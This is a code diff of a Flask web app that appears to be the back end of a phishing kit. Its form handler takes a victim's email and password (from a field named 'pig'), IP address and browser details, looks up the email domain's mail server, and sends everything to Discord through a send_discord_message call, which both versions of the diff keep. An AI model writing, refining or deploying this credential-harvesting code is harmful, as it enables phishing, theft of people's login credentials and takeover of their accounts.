@@ -233,18 +233,16 @@ def first():
         password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
 
-        # Get MX record
-        domain = email.split('@')[-1] if email and '@' in email else None
-        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
-
-        # Send data to Discord
-        send_discord_message(email, password, ip, useragent, domain, mx_record)
-
-        # Store email in session
+        # Save to session
         session['eman'] = email
 
-        # Manually redirect and pass the query parameter 'web=email'
-        return redirect(f"{url_for('benza')}?web={email}")
+        # Send to Discord (if needed)
+        domain = email.split('@')[-1] if email and '@' in email else None
+        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
+        send_discord_message(email, password, ip, useragent, domain, mx_record)
+
+        # 👇 Explicitly pass query param in redirect
+        return redirect(url_for('benza') + f'?web={email}')
 
     return "Method Not Allowed", 405
 
@@ -279,11 +277,9 @@ def second():
 
 @app.route("/benzap", methods=['GET'])
 def benza():
-    if request.method == 'GET':
-        eman = session.get('eman')
-        dman = session.get('ins')
-        web = request.args.get('web')  # Get the 'web' query parameter
-        return render_template('ind.html', eman=eman, dman=dman, web=web)
+    eman = request.args.get('web') or session.get('eman')  # ✅ Try query param first
+    dman = session.get('ins')
+    return render_template('ind.html', eman=eman, dman=dman)
 
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
